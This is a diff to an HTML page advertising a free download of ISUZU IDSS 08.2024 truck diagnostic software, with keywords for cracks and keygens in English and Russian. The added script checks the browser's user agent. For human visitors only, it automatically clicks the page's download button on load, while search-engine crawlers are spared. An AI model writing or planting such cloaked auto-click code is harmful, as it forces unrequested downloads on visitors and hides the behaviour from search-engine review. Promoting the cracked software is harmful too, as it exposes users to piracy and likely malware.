@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ISUZU IDSS USA 08.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download ISUZU IDSS USA 08.2024 diagnostic software for ISUZU trucks. Unlimited license, 16.5 GB, Windows compatible. Free download available.">
     <meta name="keywords" content="ISUZU IDSS USA 08.2024, ISUZU IDSS diagnostic software, ISUZU IDSS diagnostic software download, ISUZU IDSS diagnostic software download free, ISUZU IDSS diagnostic software keygen, ISUZU IDSS diagnostic software crack, ISUZU IDSS 16.5 GB download, ISUZU IDSS unlimited license, ISUZU IDSS Windows 7, ISUZU IDSS Windows 10, ISUZU IDSS Windows 11, ISUZU IDSS truck diagnostics, ISUZU diagnostic USA, ISUZU truck diagnostics software 2024, ISUZU IDSS каталог диагностики, скачать ISUZU IDSS диагностика, ISUZU IDSS бесплатное скачивание, ISUZU IDSS диагностика скачать бесплатно, ISUZU IDSS диагностический софт, ISUZU IDSS диагностический софт 2024, Загрузить ISUZU IDSS, ISUZU IDSS 2024, ISUZU IDSS версия 08.2024, ISUZU IDSS США скачать">
     <style>
